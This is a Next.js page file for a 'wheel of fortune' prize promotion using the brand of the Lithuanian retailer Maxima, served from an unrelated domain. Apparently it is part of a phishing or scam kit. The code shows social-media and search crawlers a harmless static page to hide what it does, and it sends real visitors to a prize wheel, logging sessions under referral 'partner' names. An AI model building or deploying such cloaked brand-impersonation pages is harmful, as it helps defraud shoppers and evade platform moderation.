import { redirect } from "next/navigation";
import { headers } from "next/headers";
import { createSessionAction } from "@/app/actions/create-session";

export const dynamic = "force-dynamic";

const SITE_URL = "https://maxima.onnemang.store";
const OG_IMAGE_ABSOLUTE = `${SITE_URL}/og-image.jpg`;

export const metadata = {
  title: "Maxima — Laimės Ratas",
  description:
    "Maxima specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir laimėkite išskirtinius prizus.",
  icons: {
    icon: "/favicon.ico",
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  metadataBase: new URL(SITE_URL),
  alternates: {
    canonical: "/",
  },
  openGraph: {
    type: "website",
    determiner: "auto",
    locale: "lt_LT",
    localeAlternate: ["en_US", "pl_PL", "ru_RU"],
    url: SITE_URL,
    siteName: "Maxima Laimės Ratas",
    title: "Maxima — Laimės Ratas",
    description:
      "Maxima specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir laimėkite išskirtinius prizus.",
    images: [
      {
        url: OG_IMAGE_ABSOLUTE,
        secureUrl: OG_IMAGE_ABSOLUTE,
        width: 1254,
        height: 1254,
        alt: "Maxima Laimės Ratas",
        type: "image/jpeg",
      },
    ],
  },
  twitter: {
    card: "summary_large_image",
    site: SITE_URL,
    title: "Maxima — Laimės Ratas",
    description:
      "Maxima specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir laimėkite išskirtinius prizus.",
    images: [OG_IMAGE_ABSOLUTE],
  },
  appLinks: {
    web: {
      url: SITE_URL,
      should_fallback: true,
    },
  },
};

type Props = {
  searchParams?: Promise<{ ref?: string }>;
};

const BOT_UA =
  /facebookexternalhit|facebot|twitterbot|whatsapp|telegrambot|linkedinbot|discordbot|slackbot|pinterest|redditbot|skypeuripreview|viber|vkshare|applebot|googlebot|bingbot|duckduckbot|baiduspider|yandex/i;

export default async function Home({ searchParams }: Props) {
  // Sosyal medya onizleme botlari icin: redirect/session OLUSTURMA,
  // direkt bu sayfanin metadata'si (og:image vb.) ile basit HTML dondur.
  // Boylece crawler ilk istekte og etiketlerini gorur ve DB'ye bos session yazilmaz.
  try {
    const h = await headers();
    const ua = h.get("user-agent") || "";
    if (BOT_UA.test(ua)) {
      return (
        <main>
          <h1>Maxima — Laimės Ratas</h1>
          <p>
            Maxima specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir
            laimėkite išskirtinius prizus.
          </p>
        </main>
      );
    }
  } catch {
    // headers() erisilemezse normal akis
  }

  let partnerName = "admin";
  try {
    const sp = await searchParams;
    if (sp?.ref && typeof sp.ref === "string" && sp.ref.trim() !== "") {
      partnerName = sp.ref.trim();
    }
  } catch {
    partnerName = "admin";
  }

  const result = await createSessionAction(partnerName);

  if (!result.success || !result.data?.id) {
    redirect("/wheel");
  }

  const sessionId = result.data.id;
  const hasShortPublicId =
    result.data.public_id != null &&
    String(result.data.public_id).trim() !== "";

  const routeSessionId = hasShortPublicId
    ? String(result.data.public_id)
    : sessionId;

  redirect(`/wheel?session=${encodeURIComponent(routeSessionId)}`);
}
